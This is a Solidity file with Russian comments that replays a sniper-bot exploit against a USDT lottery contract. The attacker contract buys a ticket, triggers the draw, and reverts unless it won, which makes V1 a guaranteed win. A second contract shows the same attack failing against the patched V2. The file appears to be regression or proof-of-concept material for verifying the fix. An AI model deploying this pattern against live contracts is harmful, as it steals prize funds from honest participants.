// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// ── Реплей реального снайпер-бота WinUSDT (инцидент 2026-11-05) ──
// Атомарная транзакция: купить билет → дёрнуть розыгрыш → если проиграли,
// revert ВСЕЙ транзакции (билет аннулируется, потерь нет) → если выиграли,
// сразу забрать приз. На V1 это гарантированный выигрыш (повторные попытки
// в новых блоках), на V2 — невозможен структурно.
//
// Намеренно БЕЗ импорта контрактов лотерей (иначе коллизия IERC20/SafeERC20,
// объявленных в обоих файлах) — только минимальные интерфейсы, как это
// сделал бы реальный бот, вызывающий контракт по адресу.

interface ILotteryV1 {
    function buyTickets(uint256 quantity) external;
    function startDraw() external;
    function claimPrize() external;
    function lastWinner() external view returns (address);
}

interface ILotteryV2 {
    function buyTickets(uint256 quantity) external;
    function triggerDraw() external;
    function claimPrize() external;
    function lastWinner() external view returns (address);
}

interface IERC20Minimal {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract SniperBotV1 {
    ILotteryV1 public immutable lottery;
    IERC20Minimal public immutable usdt;

    constructor(address lotteryAddr, address usdtAddr) {
        lottery = ILotteryV1(lotteryAddr);
        usdt = IERC20Minimal(usdtAddr);
    }

    function arm() external {
        usdt.approve(address(lottery), type(uint256).max);
    }

    function attack() external {
        lottery.buyTickets(1);
        lottery.startDraw();
        require(lottery.lastWinner() == address(this), "lose");
        lottery.claimPrize();
    }
}

// Та же атака против V2: triggerDraw требует FULL + захваченный хеш,
// поэтому атомарный «купил-выиграл-забрал» ревертится целиком.
contract SniperBotV2 {
    ILotteryV2 public immutable lottery;
    IERC20Minimal public immutable usdt;

    constructor(address lotteryAddr, address usdtAddr) {
        lottery = ILotteryV2(lotteryAddr);
        usdt = IERC20Minimal(usdtAddr);
    }

    function arm() external {
        usdt.approve(address(lottery), type(uint256).max);
    }

    function attack() external {
        lottery.buyTickets(1);
        lottery.triggerDraw();
        require(lottery.lastWinner() == address(this), "lose");
        lottery.claimPrize();
    }
}
